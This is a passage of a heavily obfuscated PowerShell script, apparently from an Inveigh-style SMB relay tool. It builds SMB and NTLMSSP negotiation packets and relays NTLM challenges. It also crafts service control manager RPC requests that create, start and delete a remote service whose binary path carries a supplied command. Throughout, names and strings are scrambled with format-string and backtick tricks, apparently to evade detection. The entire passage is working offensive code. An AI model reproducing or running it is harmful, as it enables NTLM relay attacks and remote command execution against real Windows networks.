        ${paCKet`_r`p`CRE`q`UesT}.("{1}{0}"-f'dd','A').Invoke(("{2}{0}{3}{1}{4}"-f'CReque','_C','RP','st','allID'),${p`ACKET`_`C`ALl_ID})
        ${PA`Ck`E`T_rpcreq`Uest}.("{0}{1}" -f 'Ad','d').Invoke(("{0}{4}{3}{1}{2}"-f 'RPCReq','H','int','t_Alloc','ues'),${pAC`Ke`T`_aLLOC_h`INT})
        ${pACkeT_`RPcRE`Q`UEsT}.("{1}{0}"-f'd','Ad').Invoke(("{2}{4}{0}{3}{1}{5}"-f'Req','est_Contex','RP','u','C','tID'),${pAck`et`_`ContEXT`_ID})
        ${paCKET`_RPcR`E`QUesT}.("{1}{0}" -f'dd','A').Invoke(("{0}{4}{2}{5}{3}{1}"-f'RP','num','eq','Op','CR','uest_'),${p`AC`kET_opnuM})

        if(${packE`T_d`A`Ta}."LE`NGth")
        {
            ${PACkET_`RPCr`EQ`UeSt}.("{1}{0}"-f 'd','Ad').Invoke(("{1}{3}{0}{2}" -f'st_Dat','RP','a','CReque'),${P`Ac`KEt_`datA})
        }

        return ${pA`CkeT_rp`c`RE`quEST}
    }

    

    function g`E`T-PacK`eTSCMO`pEnSCmA`NagE`Rw()
    {
        param ([Byte[]]${PA`c`kEt_S`erVi`cE},[Byte[]]${PaCKET`_SeR`VI`c`E_leNGTh})

        [Byte[]]${P`AcK`eT_wRITe_Le`N`g`Th} =  ${w`2EHX}::("{1}{0}{2}" -f 'te','GetBy','s').Invoke(${pA`c`kET_SeR`VI`Ce}."L`ENgTh" + 92)
        [Byte[]]${PAC`kE`T_FR`AG_LE`N`GtH} = ${PA`cKet`_wrI`Te_LeNGth}[0,1]
        [Byte[]]${pac`k`et_`A`LLoC_H`INT} =   ${W2E`Hx}::("{2}{1}{0}" -f 's','etByte','G').Invoke(${PA`C`KEt`_S`erviCE}."LEng`Th" + 68)
        ${PACkET_refere`N`T_`iD1} = [String](1..2 | &("{2}{1}{0}" -f'ect','Obj','ForEach-') {"{0:X2}" -f (&("{2}{1}{0}"-f 'om','et-Rand','G') -Minimum 1 -Maximum 255)})
        ${pacK`e`T_Refe`REnT_id1} = ${P`ACKe`T_Re`FER`E`NT_ID1}.("{0}{1}"-f'S','plit').Invoke(" ") | &("{2}{1}{0}"-f 't','h-Objec','ForEac'){[Char]  ( &("{1}{3}{0}{2}"-f'rIa','Get-','bLE','va') KPa )."VA`lUe"::("{1}{0}{2}"-f '1','ToInt','6').Invoke(${_},16)}
        ${PacKET`_`RefereNT`_Id1} += 0x00,0x00
        ${PAckET_`REfeR`eNT`_I`D2} = [String](1..2 | &("{1}{0}{2}"-f 'e','ForEach-Obj','ct') {"{0:X2}" -f (&("{2}{0}{1}{3}"-f't','-R','Ge','andom') -Minimum 1 -Maximum 255)})
        ${pAcKEt_RE`Fer`enT_`iD2} = ${PaCKe`T`_rE`Fe`RENT_i`d2}.("{0}{1}" -f 'Spli','t').Invoke(" ") | &("{0}{4}{3}{2}{1}" -f 'ForEa','t','-Objec','h','c'){[Char]  ( &("{1}{0}"-f 'CI','g')  vARIaBLe:kPA  )."v`Alue"::("{0}{1}" -f 'T','oInt16').Invoke(${_},16)}
        ${P`AC`K`eT_RE`F`eRENT_Id2} += 0x00,0x00

        ${P`ACKE`T`_SCmOPE`NscmAn`AgE`RW} = &("{2}{1}{0}" -f 'bject','O','New-') ("{4}{12}{11}{2}{3}{0}{1}{8}{6}{10}{9}{5}{7}" -f's.S','pec','ectio','n','S','ed','.Or','Dictionary','ialized','er','d','l','ystem.Col')
        ${Pa`ckE`T`_ScMoP`enScM`An`Age`RW}.("{1}{0}"-f 'dd','A').Invoke(("{1}{2}{4}{5}{3}{0}{6}{8}{10}{9}{7}"-f 'N','SCMO','penS','Machine','CManager','W_','ame_Refe','D','r','I','ent'),${pACKEt_`ReFeREn`T`_ID1})
        ${PaCKE`T`_`SCmOp`E`NSCM`ANAGERW}.("{0}{1}" -f'A','dd').Invoke(("{5}{8}{3}{0}{2}{1}{4}{7}{6}" -f'r','hineN','W_Mac','anage','ame','SC','axCount','_M','MOpenSCM'),${p`ACk`E`T_seRVICe_`lEnGTh})
        ${P`AcK`et`_sC`m`o`pEnSCMAnAGErw}.("{0}{1}"-f 'A','dd').Invoke(("{7}{0}{1}{5}{3}{6}{4}{2}" -f'anagerW_Mac','h','et','Nam','ffs','ine','e_O','SCMOpenSCM'),[Byte[]](0x00,0x00,0x00,0x00))
        ${p`A`cKe`T_scMOpenscm`AnAG`Erw}.("{0}{1}"-f 'Ad','d').Invoke(("{5}{0}{2}{6}{4}{3}{7}{1}"-f 'CMana','nt','gerW_M','e_A','eNam','SCMOpenS','achin','ctualCou'),${pAc`kEt_sErVi`c`e`_`Leng`Th})
        ${pACKE`T_S`C`MO`p`enS`C`MAnagERw}.("{0}{1}"-f 'Ad','d').Invoke(("{6}{4}{2}{1}{5}{7}{0}{3}"-f 'eNam','ag','Man','e','enSC','e','SCMOp','rW_Machin'),${p`ACkeT_Se`RVi`Ce})
        ${PAcKe`T_scMo`PEnScMa`Nage`Rw}.("{0}{1}"-f 'Ad','d').Invoke(("{5}{1}{0}{7}{4}{2}{3}{6}"-f 'gerW_Databa','CMana','n','tI','Refere','SCMOpenS','D','se_'),${paCk`Et`_REFerEnt`_ID2})
        ${pa`C`KET_scMo`Pe`NSc`M`AnagERw}.("{0}{1}" -f 'Ad','d').Invoke(("{0}{4}{6}{3}{1}{7}{5}{2}" -f'SCMOpenSC','_','xCount','W_Database','Manag','meMa','er','Na'),[Byte[]](0x0f,0x00,0x00,0x00))
        ${pa`C`k`ET`_scMO`pENsCm`ANA`GeRW}.("{1}{0}"-f'd','Ad').Invoke(("{8}{7}{3}{5}{6}{0}{2}{1}{9}{4}"-f'gerW','taba','_Da','M','ameOffset','an','a','enSC','SCMOp','se_N'),[Byte[]](0x00,0x00,0x00,0x00))
        ${pACket_sCMOP`ENS`c`M`A`Na`g`ERw}.("{1}{0}" -f'd','Ad').Invoke(("{2}{4}{5}{6}{1}{3}{0}" -f 'Count','a','SCMOpenSCMa','meActual','nager','W_Databa','se_N'),[Byte[]](0x0f,0x00,0x00,0x00))
        ${PA`ckET_`s`Cm`oPEnsc`m`AnAGe`RW}.("{0}{1}" -f 'A','dd').Invoke(("{3}{1}{0}{4}{2}"-f'rW_','Manage','se','SCMOpenSC','Databa'),[Byte[]](0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x73,0x00,0x41,0x00,0x63,0x00,0x74,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x00,0x00))
        ${p`Ac`kEt_`sCMoPenSCMa`NageRW}.("{1}{0}" -f'd','Ad').Invoke(("{6}{5}{2}{1}{4}{7}{0}{3}"-f'_Unknow','OpenSCManag','M','n','e','C','S','rW'),[Byte[]](0xbf,0xbf))
        ${PAcKE`T_S`CMo`PE`NScmA`N`AGeRW}.("{0}{1}" -f 'A','dd').Invoke(("{0}{4}{3}{5}{6}{1}{2}"-f'SC','s','Mask','SC','MOpen','Manag','erW_Acces'),[Byte[]](0x3f,0x00,0x00,0x00))
    
        return ${P`AcKeT_S`CMo`pENSCmA`NagERw}
    }

    function g`eT-pAc`Ke`Tsc`mcRea`TEse`RV`IC`EW()
    {
        param([Byte[]]${pa`CkeT_`C`o`NtE`Xt_Han`dle},[Byte[]]${pACK`E`T_sEr`VicE},[Byte[]]${pa`cket_`Ser`Vi`C`E_LengTH},
                [Byte[]]${pa`C`k`Et_cOmm`And},[Byte[]]${P`Ack`eT`_COmMa`ND_Le`Ngth})
                
        ${pACKe`T_rE`FErE`NT`_ID} = [String](1..2 | &("{2}{1}{3}{0}{4}" -f'ec','rEa','Fo','ch-Obj','t') {"{0:X2}" -f (&("{1}{3}{2}{0}"-f'm','Get','o','-Rand') -Minimum 1 -Maximum 255)})
        ${p`ACKET`_rEF`e`REnT_`Id} = ${pA`ckET`_rE`FErE`Nt_iD}.("{1}{0}"-f'lit','Sp').Invoke(" ") | &("{0}{2}{1}{3}"-f 'Fo','Ob','rEach-','ject'){[Char] ( &('gI')  VArIAblE:kPa)."val`Ue"::("{1}{2}{0}"-f'nt16','To','I').Invoke(${_},16)}
        ${PACKe`T_rEf`EREn`T`_iD} += 0x00,0x00

        ${pAc`KeT_SCmC`Re`AT`EServIcEw} = &("{2}{1}{0}"-f'Object','w-','Ne') ("{4}{6}{5}{7}{8}{0}{2}{3}{1}"-f'tio','ary','ns.Specialized.Orde','redDiction','Sy','oll','stem.C','e','c')
        ${pac`ke`T_sCm`CRe`A`TeS`ervicEW}.("{0}{1}" -f'A','dd').Invoke(("{1}{2}{5}{7}{3}{0}{6}{4}"-f 'eW_Conte','SCM','Crea','vic','le','te','xtHand','Ser'),${paCk`et_`Con`T`e`xt`_hANdLe})
        ${PacKet_S`cmc`RE`A`Te`sER`Vi`cEw}.("{0}{1}"-f 'A','dd').Invoke(("{1}{0}{4}{5}{2}{3}{6}"-f'CMCrea','S','_M','axCo','teServiceW_Ser','viceName','unt'),${p`ACKet`_`S`eRvice_l`En`GTh})
        ${paCkE`T_`SCMcreaTes`ERVI`CEW}.("{1}{0}"-f'dd','A').Invoke(("{8}{3}{0}{6}{9}{5}{7}{10}{4}{1}{2}"-f 'reateS','f','fset','CMC','O','eW_Servic','ervi','eNa','S','c','me_'),[Byte[]](0x00,0x00,0x00,0x00))
        ${pA`CKEt_sc`MCRE`AtesERvI`cEw}.("{1}{0}"-f 'd','Ad').Invoke(("{7}{1}{2}{3}{0}{10}{6}{8}{9}{5}{4}" -f'ceW_Se','ateS','er','vi','nt','Cou','e','SCMCre','Name_','Actual','rvic'),${pAC`keT`_s`E`RvICE_lEnGth})
        ${PacK`et_s`c`MCr`eateseR`VIC`EW}.("{1}{0}" -f 'd','Ad').Invoke(("{2}{5}{3}{1}{6}{0}{4}" -f'ceW_Serv','eS','SCM','at','iceName','Cre','ervi'),${PA`ckEt_SERVI`cE})
        ${P`Ack`ET_SCM`Cr`Ea`TEServ`ic`ew}.("{0}{1}"-f'Ad','d').Invoke(("{6}{0}{8}{2}{10}{9}{1}{5}{7}{4}{3}"-f'rvi','_R','eW','D','ntI','efe','SCMCreateSe','re','c','me','_DisplayNa'),${PACkEt`_`R`e`FEreNT_`id})
        ${PA`Cke`T_`SCMC`REa`TES`ErVicew}.("{1}{0}"-f 'd','Ad').Invoke(("{6}{9}{1}{7}{4}{2}{0}{8}{10}{3}{5}" -f 'playNa','Servi','Dis','oun','_','t','S','ceW','me_M','CMCreate','axC'),${PA`c`K`et_`se`RVIcE_lenG`TH})
        ${PaCkEt_s`cmcr`Ea`T`e`SER`VIcew}.("{0}{1}"-f'A','dd').Invoke(("{6}{1}{2}{7}{3}{4}{0}{5}{8}" -f'ame_','eServic','eW','play','N','Off','SCMCreat','_Dis','set'),[Byte[]](0x00,0x00,0x00,0x00))
        ${p`AckEt`_sCMCr`eATE`S`E`RviCEW}.("{0}{1}"-f'Ad','d').Invoke(("{2}{4}{1}{5}{6}{3}{7}{0}"-f 'alCount','ayNa','SCMCreat','t','eServiceW_Displ','me_A','c','u'),${PaCkeT_S`e`RVIc`E_le`NgTH})
        ${Pa`cKet_ScM`CRe`AT`ESeRviCew}.("{1}{0}"-f'dd','A').Invoke(("{7}{3}{6}{5}{1}{2}{4}{0}" -f'Name','r','viceW_Disp','ea','lay','Se','te','SCMCr'),${PaC`K`ET_`serVice})
        ${PaCke`T_s`cM`c`R`EaTESeRvIc`Ew}.("{1}{0}" -f'd','Ad').Invoke(("{5}{3}{7}{4}{1}{0}{2}{6}"-f 'cce','A','s','reateS','iceW_','SCMC','sMask','erv'),[Byte[]](0xff,0x01,0x0f,0x00))
        ${pa`c`k`eT_Sc`mcrEaTESeRV`ICEW}.("{0}{1}"-f'A','dd').Invoke(("{6}{1}{3}{0}{5}{2}{4}" -f 'eS','r','W_Servi','eat','ceType','ervice','SCMC'),[Byte[]](0x10,0x00,0x00,0x00))
        ${p`AC`Ket`_`sc`m`crEAtESERVIcEW}.("{1}{0}"-f'dd','A').Invoke(("{9}{2}{7}{4}{0}{8}{1}{5}{6}{3}" -f'Servic','rviceStar','Cr','pe','te','tT','y','ea','eW_Se','SCM'),[Byte[]](0x03,0x00,0x00,0x00))
        ${pA`cK`E`T_sCm`CreATesEr`Vi`ceW}.("{1}{0}"-f'd','Ad').Invoke(("{8}{10}{7}{5}{1}{2}{6}{0}{9}{4}{3}" -f'e','erv','i','eErrorControl','c','eS','c','t','SCMCre','W_Servi','a'),[Byte[]](0x00,0x00,0x00,0x00))
        ${PAc`ke`T_`SC`M`CREAte`sE`RVICew}.("{1}{0}"-f'dd','A').Invoke(("{10}{5}{11}{4}{9}{2}{3}{0}{1}{7}{8}{6}" -f '_Bina','ryPathName','i','ceW','Creat','C','unt','_Max','Co','eServ','S','M'),${PA`cK`ET`_`cO`Mm`ANd_lEngTh})
        ${pa`ck`Et`_sCmcREATE`SeRvicew}.("{0}{1}" -f'Ad','d').Invoke(("{3}{0}{1}{2}{6}{9}{5}{8}{4}{10}{7}" -f 'Crea','teS','ervi','SCM','thNam','inary','c','t','Pa','eW_B','e_Offse'),[Byte[]](0x00,0x00,0x00,0x00))
        ${P`AC`KEt_SCM`CreAtESErVi`CEw}.("{1}{0}"-f 'dd','A').Invoke(("{2}{5}{4}{9}{6}{7}{12}{11}{3}{1}{8}{0}{10}" -f 'oun','al','SCMCreateService','tu','_B','W','ary','P','C','in','t','ame_Ac','athN'),${pACKEt_cOmm`An`D_l`E`Ng`TH})
        ${pAc`Ket_S`C`McR`EAteS`ervIcew}.("{1}{0}" -f 'dd','A').Invoke(("{1}{4}{0}{6}{5}{3}{7}{2}" -f'teSe','SCM','naryPathName','_B','Crea','viceW','r','i'),${pack`Et_cO`Mmand})
        ${PAckeT`_scmc`Rea`T`Es`Er`ViCEW}.("{0}{1}"-f'Ad','d').Invoke(("{5}{1}{4}{6}{0}{2}{3}" -f'Point','MCreateServic','e','r','eW_NU','SC','LL'),[Byte[]](0x00,0x00,0x00,0x00))
        ${pa`C`KEt_SCM`C`R`EAtE`SeRviC`ew}.("{0}{1}"-f 'A','dd').Invoke(("{5}{2}{0}{4}{6}{3}{1}" -f 'i','ID','teServ','_Tag','c','SCMCrea','eW'),[Byte[]](0x00,0x00,0x00,0x00))
        ${PaCkEt`_`sCM`cR`E`AtesEr`VicEW}.("{0}{1}"-f'Ad','d').Invoke(("{5}{1}{3}{6}{8}{2}{0}{4}{7}" -f'W_N','Crea','e','t','ULLPoint','SCM','eS','er2','ervic'),[Byte[]](0x00,0x00,0x00,0x00))
        ${P`Ack`E`T_sCmCR`eat`eS`ErVi`CeW}.("{1}{0}" -f 'd','Ad').Invoke(("{3}{5}{4}{0}{1}{2}" -f 'eServiceW_Depen','d','Size','S','eat','CMCr'),[Byte[]](0x00,0x00,0x00,0x00))
        ${Pa`CK`Et_`scm`c`ReATesEr`Vicew}.("{1}{0}" -f'dd','A').Invoke(("{7}{2}{8}{6}{3}{4}{1}{0}{5}" -f 'Po','_NULL','CMC','rvice','W','inter3','teSe','S','rea'),[Byte[]](0x00,0x00,0x00,0x00))
        ${pa`ckEt_sC`M`Cre`ATESer`Vi`cEW}.("{1}{0}"-f 'd','Ad').Invoke(("{3}{2}{5}{0}{1}{4}" -f 'erviceW_NU','LL','t','SCMCrea','Pointer4','eS'),[Byte[]](0x00,0x00,0x00,0x00))
        ${P`ACkEt_scMc`REA`TE`SeR`V`iceW}.("{1}{0}" -f'd','Ad').Invoke(("{3}{2}{4}{8}{0}{6}{5}{1}{7}"-f'v','eW_','MCreat','SC','eS','c','i','PasswordSize','er'),[Byte[]](0x00,0x00,0x00,0x00))

        return ${P`ACk`ET_S`cMc`ReaTESEr`VIC`Ew}
    }

    function Ge`T-pa`CKETsc`M`sTArTse`Rvic`ew()
    {
        param([Byte[]]${p`AC`KeT_CoNteXt_`han`dlE})

        ${Pack`eT_sc`msTa`RtS`ErvIcEW} = &("{0}{2}{1}"-f'N','ject','ew-Ob') ("{7}{8}{4}{0}{6}{1}{3}{2}{5}" -f 'o','ecialized.Ord','redDict','e','ti','ionary','ns.Sp','Syste','m.Collec')
        ${pA`CK`ET_Sc`M`S`TaRtseRViceW}.("{1}{0}"-f 'd','Ad').Invoke(("{3}{4}{5}{6}{1}{0}{2}" -f 'Han','ext','dle','S','C','MStartServic','eW_Cont'),${pack`eT_Co`N`T`e`xt`_hanDle})
        ${Pa`CKet_`scMSTA`RTS`erVICEw}.("{1}{0}"-f'dd','A').Invoke(("{0}{4}{3}{2}{1}" -f 'S','Unknown','erviceW_','tS','CMStar'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        return ${PAc`kET_`ScMSTar`TServic`EW}
    }

    function Get`-PaC`KetSc`mDElEte`s`erv`iCEW()
    {
        param([Byte[]]${PaCKeT_c`ONteXt_h`AN`D`Le})

        ${P`Ac`KET_S`CMdE`lE`TeSeRvI`cEw} = &("{2}{1}{0}"-f't','w-Objec','Ne') ("{2}{8}{10}{7}{4}{5}{11}{12}{0}{3}{6}{1}{9}" -f 'i','onar','Sy','c','i','ons.Specia','ti','t','stem.Colle','y','c','lized.','OrderedD')
        ${p`AckE`T_sCMdelET`EsErV`i`ceW}.("{1}{0}"-f'dd','A').Invoke(("{1}{2}{3}{4}{6}{5}{0}" -f'ndle','SCMDelete','Ser','viceW_','C','extHa','ont'),${PackET`_conte`xt_`HaN`dLE})

        return ${p`A`CkEt_scmdEL`ET`E`servi`CEw}
    }

    function get-p`ACKET`scm`ClOS`Eser`VICeh`ANd`le()
    {
        param([Byte[]]${PAc`Ket`_CONTE`XT`_`HANDLE})

        ${PACkeT_S`c`M_CL`osE`Se`R`ViCEw} = &("{0}{2}{1}" -f'N','ject','ew-Ob') ("{3}{12}{10}{0}{5}{7}{11}{9}{6}{4}{8}{2}{1}" -f 'tio','ry','a','S','Dic','ns.Speci','red','aliz','tion','e','Collec','ed.Ord','ystem.')
        ${PA`CkEt`_s`Cm_`cLoSeSERVICEw}.("{1}{0}" -f 'dd','A').Invoke(("{2}{1}{0}{4}{3}{5}" -f 'ont','W_C','SCMCloseService','xtHand','e','le'),${p`AcKe`T`_CoN`Te`Xt_HandLE})

        return ${PACkE`T`_SCm`_cL`o`seSeR`Vi`cew}
    }

}


${SM`B_NtLM_fuN`CTioNS`_S`CRI`ptbLoCk} =
{
    function SMB`NTLmCh`Al`leNGe
    {
        param ([Byte[]]${paYLOa`d`_`BYTes})

        ${paylO`AD} =   ${w2e`HX}::("{0}{1}{2}" -f'ToStri','n','g').Invoke(${PaYl`o`Ad_by`TES})
        ${paylo`Ad} = ${p`AYLo`AD} -replace "-",""
        ${NT`lM_`in`dEx} = ${pAYl`oaD}.("{2}{0}{1}"-f'nd','exOf','I').Invoke(("{3}{0}{1}{2}"-f '544C4D5','35350','00','4E'))

        if(${p`AY`load}.("{2}{1}{0}" -f'ing','tr','SubS').Invoke((${NT`LM_`INDex} + 16),8) -eq ("{1}{2}{0}"-f '0000','0','200'))
        {
            ${ntL`m`_Ch`A`LlENgE} = ${PAY`l`oad}.("{2}{1}{0}"-f'String','b','Su').Invoke((${Nt`L`M_`INDEx} + 48),16)
        }

        return ${NTl`M_c`Hal`L`enge}
    }

}


${Sm`B_rEL`Ay_`CHAlle`NgE_`SC`RI`PtblO`ck} =
{
    function Smbrel`AY`ch`A`l`lengE
    {
        param (${Sm`B_r`eL`Ay_sOCkET},${HTTp_rEQUes`T_`ByT`es},${SM`B_V`Er`sION})

        if(${smB`_RelaY_S`ocK`ET})
        {
            ${SmB_Rel`A`Y`_chaLlE`N`G`E_sTr`E`Am} = ${sMb_r`E`l`A`Y`_SocKEt}.("{0}{1}{2}" -f 'G','etS','tream').Invoke()
        }
        
        ${sM`B_`c`lienT_rECeI`Ve} = &("{0}{1}{2}"-f'New','-','Object') ("{4}{0}{1}{3}{2}" -f'stem.B','y','[]','te','Sy') 1024
        ${SM`B_C`L`IENT_ST`AgE} = ("{0}{2}{1}" -f 'N','MB','egotiateS')
        
        :SMB_relay_challenge_loop while(${S`Mb_clI`eN`T_s`TaGe} -ne ("{1}{0}" -f'it','ex'))
        {
        
            switch (${sm`B_clien`T_S`T`AgE})
            {

                ("{0}{1}{2}{3}" -f'Nego','t','iateSM','B')
                {
                    ${PaC`kEt`_sMB_hE`ADER} = &("{3}{1}{0}{2}"-f 'tSMBHe','cke','ader','Get-Pa') 0x72 0x18 0x01,0x48 0xff,0xff ${INVEi`Gh}."PrOcEss`_`iD_bytes" 0x00,0x00       
                    ${Pa`ck`Et_`sMb_daTA} = &("{5}{7}{2}{1}{0}{4}{6}{3}" -f'e','at','tSMBNegoti','st','ProtocolRe','Get-','que','Packe') ${Smb_V`ers`IoN}
                    ${sMB`_hea`D`eR} = &("{4}{0}{1}{6}{7}{5}{2}{3}"-f'rom-P','acketOrd','r','y','ConvertF','ona','ered','Dicti') ${Pa`C`K`Et_SmB_heA`der}
                    ${SM`B`_Da`Ta} = &("{10}{4}{6}{3}{9}{7}{2}{1}{8}{0}{5}"-f 'ctio','der','Or','-Pac','nvertF','nary','rom','t','edDi','ke','Co') ${PA`cKet_s`MB_da`TA}
                    ${Pac`KE`T_nEtb`ioS_S`eSs`ION_Se`Rv`Ice} = &("{6}{0}{1}{4}{3}{5}{2}" -f'Pack','etNetBIO','e','ss','SSe','ionServic','Get-') ${sm`B`_HEad`Er}."le`NG`Th" ${SM`B_`DaTA}."L`EngtH"
                    ${nETBioS_s`E`s`sio`N`_sE`RviCE} = &("{4}{0}{1}{3}{2}{5}{6}{7}" -f 'm-Pack','e','er','tOrd','ConvertFro','edD','i','ctionary') ${p`AcKe`T_NE`TBIos_Ses`SIo`N_Se`R`V`I`Ce}
                    ${s`mB`_CLI`En`T`_SeND} = ${ne`TBiOs_sESs`i`ON`_SerViCe} + ${SM`B`_HEaDER} + ${sMb_D`A`TA}
                    ${smB`_R`ELay`_cH`A`LlEN`GE_`STREaM}.("{0}{1}"-f 'Wri','te').Invoke(${S`m`B_`cLiEn`T_seNd},0,${sM`B`_CLIent_S`end}."LENG`TH") > ${NU`Ll}
                    ${SmB_reL`A`Y_c`Ha`lLEnGE_st`ReAM}.("{0}{1}" -f 'Fl','ush').Invoke()    
                    ${sMb_reL`AY_cHa`LL`eN`Ge_`stReAm}.("{0}{1}"-f'Re','ad').Invoke(${SM`B_CliEnt`_`R`ECE`iVe},0,${sM`B_CLiEN`T_`RE`ceive}."L`ENgTh") > ${NU`ll}

                    if( (  &("{2}{1}{0}" -f'rIabLE','a','Get-v') W2ehx  -VaLUeon  )::"to`sTR`iNG"(${SMB_`cliEN`T_Re`cEIVe}[4..7]) -eq ("{3}{1}{2}{0}" -f'2','-4','d-4','ff-53'))
                    {
                        ${SMB_Ve`RS`Ion} = ("{0}{1}" -f'S','MB1')
                        ${SMB_`C`liENT_stA`GE} = ("{1}{3}{2}{0}"-f'e','NTL','Negotiat','MSSP')
                    }
                    else
                    {
                        ${sm`B`_Cl`Ie`Nt_sta`GE} = ("{1}{0}{2}{4}{3}"-f'tiat','Nego','eSM','2','B')
                    }

                    if((${S`Mb_`VER`SIon} -eq ("{0}{1}"-f 'SMB','1') -and  ( &("{2}{1}{3}{0}"-f'E','t-VA','GE','RIABl') w2ehx -vALu )::"To`S`TRiNG"(${SmB_cliEnT`_re`C`E`iVe}[39]) -eq '0f') -or (${SMB`_Ve`RSI`oN} -ne ("{0}{1}"-f'SMB','1') -and  ${w`2E`HX}::"tO`ST`RiNG"(${sM`B_CL`IeNT_`Re`ceiVe}[70]) -eq '03'))
                    {
                        ${i`Nv`eiGh}."cON`sole_`qUEuE".("{1}{0}"-f 'dd','A').Invoke(('SMB'+' '+'r'+'e'+'lay '+'disab'+'led'+' '+'due'+' '+'t'+'o '+'S'+'MB '+'s'+'ig'+'ning '+'require'+'me'+'nt'+' '+'o'+'n '+"$Target"))
                        ${sm`B_`RelA`y_`S`OcKet}.("{1}{0}" -f 'se','Clo').Invoke()
                        ${s`mB_c`li`ENt_rec`EIvE} = ${NU`ll}
                        ${Inve`I`Gh}."S`mB_`RElay" = ${Fa`LSe}
                        ${SmB_CL`I`E`N`T_st`AGe} = ("{1}{0}"-f 'it','ex')

                        if(${INVeI`gh}."FI`l`E_OutpUT")
                        {
                            ${inVeI`gH}."l`O`g`_fIle`_quEUE".("{1}{0}" -f 'd','Ad').Invoke(("$(Get-Date -format 's') - SMB relay disabled due to SMB signing requirement on $Target "))
                        }

                        if(${I`NvE`IGH}."Log_`O`UTpuT")
                        {
                            ${InVEi`GH}."l`oG".("{1}{0}"-f 'd','Ad').Invoke(("$(Get-Date -format 's') - SMB relay disabled due to SMB signing requirement on $Target "))
                        }

                    }

                }
                
                ("{1}{2}{3}{0}{4}"-f'eSMB','N','egotia','t','2')
                { 
                    ${sm`B2_`T`ReE_iD} = 0x00,0x00,0x00,0x00
                    ${SMB`_sEss`iOn`_iD} = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                    ${s`Mb2_`Me`ssaGe`_iD} = 1
                    ${P`Ac`ket_SmB2`_HEaD`er} = &("{1}{3}{0}{2}" -f'SMB2Heade','G','r','et-Packet') 0x00,0x00 ${SmB2_m`E`s`sAgE_Id} ${S`M`B2_`Tr`EE_id} ${SMb_se`ssIO`N_iD}  
                    ${PAC`K`e`T_SmB2_D`Ata} = &("{1}{5}{6}{4}{2}{3}{0}" -f 'rotocolRequest','Get-Pack','te','P','ia','e','tSMB2Negot')
                    ${S`M`B2_hEAd`Er} = &("{0}{3}{5}{7}{6}{2}{1}{4}" -f'Conver','edD','er','tFro','ictionary','m-Pack','tOrd','e') ${P`Ac`kEt_SMb2_HE`A`dER}
                    ${Smb`2`_DaTa} = &("{9}{5}{0}{4}{7}{1}{2}{8}{3}{6}" -f'om','O','rd','onar','-P','tFr','y','acket','eredDicti','Conver') ${P`AckEt_`Sm`B2`_DATA}
                    ${PaC`kEt_ne`TbIOS_S`E`S`SiO`N_servI`Ce} = &("{4}{5}{1}{2}{0}{3}"-f'etBI','-Packet','N','OSSessionService','G','et') ${sM`B2_`heaDEr}."l`e`NGTh" ${Sm`B`2_dATA}."L`enGth"
                    ${ne`TBiO`S_S`e`ss`IoN`_seRvIce} = &("{4}{7}{8}{1}{6}{2}{3}{0}{5}" -f 'edDi','m-Pac','etOrde','r','Conve','ctionary','k','rt','Fro') ${pACKET_`NeTbios_Ses`sI`O`N_SE`RV`icE}
                    ${smB_ClI`e`Nt_S`E`Nd} = ${NE`TbIO`S_sESsiOn`_SerV`ice} + ${sMb2_`HE`AD`ER} + ${SMb2_`Da`Ta}
                    ${smb`_rEL`AY_cha`lLEnGE_s`TReAm}.("{1}{0}"-f'ite','Wr').Invoke(${Sm`B`_C`Lient`_sEnD},0,${sM`B_CLiEnt`_`S`end}."LEn`gTH") > ${NU`Ll}
                    ${smB_`RElaY_chAl`LEn`g`E_`STr`eAM}.("{1}{0}"-f 'h','Flus').Invoke()    
                    ${smb_r`ElaY_C`hA`l`LeNGE_S`TREAM}.("{1}{0}"-f 'ad','Re').Invoke(${sM`B_ClIe`NT_`RECE`ivE},0,${sm`B`_C`Lie`NT`_REceIve}."l`EN`GTh") > ${nU`ll}
                    ${sMB`_ClI`eNT_stA`GE} = ("{0}{3}{4}{1}{2}"-f 'NT','iat','e','L','MSSPNegot')
                }

                ("{0}{1}{3}{2}"-f'NTLMSSP','Neg','te','otia')
                { 
                    
                    if(${sMB_v`eRS`IoN} -eq ("{1}{0}" -f 'B1','SM'))
                    {
                        ${pa`cK`Et_`SMB`_Hea`deR} = &("{1}{2}{3}{0}" -f'Header','Get-Packe','tS','MB') 0x73 0x18 0x01,0x48 0xff,0xff ${i`N`VeIGh}."PR`oCeSS_iD_bYt`Es" 0x00,0x00
                        ${P`A`CKE`T_`NtlmS`SP_neGoTiAtE} = &("{3}{5}{1}{4}{0}{6}{2}" -f'M','etN','Negotiate','G','TL','et-Pack','SSP') 0x07,0x82,0x08,0xa2 ${ht`TP_`R`EQUESt`_bYt`ES}[(${htt`p`_reQU`Est_`B`yTEs}."lE`NgtH"-8)..(${ht`Tp`_r`E`qUE`sT_BytES}."LE`Ng`Th")]
                        ${Sm`B`_HEAD`ER} = &("{3}{2}{1}{4}{6}{0}{5}{7}"-f'et','Fro','t','Conver','m-P','OrderedDic','ack','tionary') ${paC`K`ET_smB`_HeADEr}
                        ${NtLMsSP`_NE`GOt`i`ATe} = &("{8}{0}{1}{7}{3}{10}{9}{6}{4}{5}{2}" -f'vertFro','m-','tionary','ke','redDi','c','rde','Pac','Con','O','t') ${packeT_Nt`lMsSP`_n`eGOTiA`Te}       
                        ${Pa`cK`E`T_sMb_`data} = &("{5}{3}{0}{6}{1}{4}{2}"-f'cketSM','essionSetu','st','-Pa','pAndXReque','Get','BS') ${ntLMSs`P`_ne`GO`T`IATE}
                        ${SMB`_D`ATA} = &("{1}{4}{3}{6}{5}{2}{0}"-f 'y','C','onar','vertFrom-Packet','on','ti','OrderedDic') ${PAC`k`et_s`mB_`D`ATa}
                        ${P`AC`Ket_nE`Tb`ioS_sESs`IOn_`sErVI`ce} = &("{4}{5}{0}{2}{3}{1}"-f 'NetBIOSSes','rvice','sionS','e','G','et-Packet') ${sMB_h`eA`deR}."LEN`gTH" ${S`M`B_datA}."L`ENg`TH"
                        ${NETBIOS_SesS`ion`_S`eRV`iCE} = &("{4}{1}{7}{0}{9}{3}{5}{2}{6}{8}"-f'de','F','Diction','e','Convert','d','ar','rom-PacketOr','y','r') ${paC`K`e`T_N`ETBIo`s_`SEssi`ON_SeRvicE}
